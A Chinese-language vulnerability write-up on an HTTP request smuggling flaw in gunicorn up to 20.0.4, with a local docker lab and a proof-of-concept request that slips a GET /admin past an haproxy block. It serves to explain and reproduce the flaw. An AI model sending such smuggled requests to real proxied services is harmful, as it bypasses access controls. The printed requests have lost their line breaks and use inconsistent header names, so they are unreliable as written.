一、前言

在gunicorn 20.0.4 版本中，存在一个请求走私漏洞，无论在gunicorn 前使用哪个代理，该漏洞都有效。 Http头中的 

Sec-Websocket-Key: 1

会进行特殊解析，从而引发此漏洞。


二、Gunicorn

Gunicorn是一个unix上被广泛使用的高性能的Python WSGI UNIX HTTP Server。
和大多数的web框架兼容，并具有实现简单，轻量级，高性能等特点。


三、漏洞版本
gunicorn <= 20.0.4

四、漏洞简析

在文件

/gunicorn/http/message.py

中有一个

set_body_reader

函数，它根据请求头确定请求正文的大小。 如果传入的请求头中包含

Sec-Websocket-Key: 1

则假定该请求的内容长度为 8（Content-Length字段会被忽略）。 如果 gunicorn 位于代理后面并使用持久连接与其通信（HTTP 1.1 中的默认设置），则将引起这个请求走私漏洞。

假设下面的请求发送到上图的 proxy（代理）

代理将看到 Content-Length，并将转发包含主体中绿色数据和红色数据的请求。 但是当请求到达 gunicorn 时，它会看到 Sec-Websocket-Ke: 1 头并且只读取正文中的绿色数据。 由于代理和 gunicorn 使用 `HTTP-keep-alive` 通信，gunicorn 将继续通过与下一个请求相同的 TCP 连接读取红色数据。 因此，红色数据发生了请求走私。


此漏洞存在10年以上，今年4月被曝光


五、漏洞复现

1. 搭建漏洞环境

git clone https://github.com/cckuailong/gunicorn_request_smugglingcd gunicorn_request_smugglingdocker-compose up --build


2. 测试

gunicorn业务正常的响应

$ curl http://localhost:5000/INDEX$ curl http://localhost:5000/forbiddenFORBIDDEN$ curl http://localhost:5000/adminADMIN


haproxy代理正常的响应

$ curl http://localhost:9999/INDEX$ curl http://localhost:9999/forbiddenFORBIDDEN$ curl http://localhost:9999/adminFORBIDDEN

P.S. 因为haproxy环境中配置了

http-request set-path /forbidden if { path_beg /admin }

所以访问 /admin 会显示FORBIDDEN


3.  Poc

4. Poc分析


发送的Poc长这样

GET / HTTP/1.1Host: localhostContent-Length: 68Sec-Websocket-Key1: x

xxxxxxxxGET /admin HTTP/1.1Host: localhostContent-Length: 35

GET / HTTP/1.1Host: localhost


Haproxy 看到的是这两个请求


GET / HTTP/1.1Host: localhostContent-Length: 68Sec-Websocket-Key1: x

xxxxxxxxGET /admin HTTP/1.1Host: localhostContent-Length: 35
GET / HTTP/1.1Host: localhost


gunicorn看到的则是这两个请求

GET / HTTP/1.1Host: localhostContent-Length: 68Sec-Websocket-Key1: x

xxxxxxxx
GET /admin HTTP/1.1Host: localhostContent-Length: 35

GET / HTTP/1.1Host: localhost

从而造成请求走私，访问到了本该拦截的 /admin 请求
